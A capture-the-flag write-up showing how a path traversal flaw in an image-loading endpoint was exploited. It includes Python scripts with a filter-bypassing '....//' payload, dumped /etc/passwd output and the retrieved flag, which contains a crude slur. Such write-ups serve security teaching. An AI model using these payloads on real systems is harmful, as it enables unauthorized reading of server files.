# Opener

## Description
```
There seems to be something wrong with this picture transfer function...
```

## Writeup

Looking at the webpage we see a function to load a picture. <br/>
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Images</title>
    <link rel="stylesheet" href="/styles.css">
</head>
<body>
<div class="container">
    <script>
        const images = ['Sample_abc.jpg', 'gosl.jpg', 'sunflower.jpg'];
        const randomImage = images[Math.floor(Math.random() * images.length)];
        fetch(`/files?file=${randomImage}`)
            .then(response => response.blob())
            .then(blob => {
                const imgUrl = URL.createObjectURL(blob);
                const imageElement = document.createElement('img');
                imageElement.src = imgUrl;
                imageElement.alt = 'Random Image';
                document.body.appendChild(imageElement);
            });
    </script>
</div>
</body>
</html>
```

Taking a look around the website only thing I found was the parameter `/files?file=`. <br/>
Using this I tested the parameter. <br/>
Using `/files?file=asd` resulted in the error message `File Not Found` but using `/files?file=index.html` I received the `index.html` page as output. <br/>
Having the information that I can read other files than the pictures I tried to execute a path traversal exploit. <br/>
I used [Hacktricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion) for this purpose. <br/>

After some tries I found one that worked. <br/>
```py
import requests

url = 'http://45.88.77.177:21002/files?file='

file_path = '....//....//....//....//etc/passwd'

req = requests.get(f"{url}{file_path}")

print(req.text)
```

Executing this script I got the output below which proved that `Path Traversal` was really possible. <br/>
```sh
kali@kali python3 ./solve.py

root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin      
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin   
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin   
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin  
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin        
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin        
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000:Linux User,,,:/home/node:/bin/sh  
```

Now I just had to find the path of the flag which didn't take long. <br/>
```py
import requests

url = 'http://45.88.77.177:21002/files?file='

file_path = '....//flag.txt'

req = requests.get(f"{url}{file_path}")

print(req.text)
```

Executing this I obtained the flag which concludes this writeup. <br/>
```sh
kali@kali kali@kali python3 ./solve.py

grodno{P47H_7R4V3r54L_NO_HOMo}
```

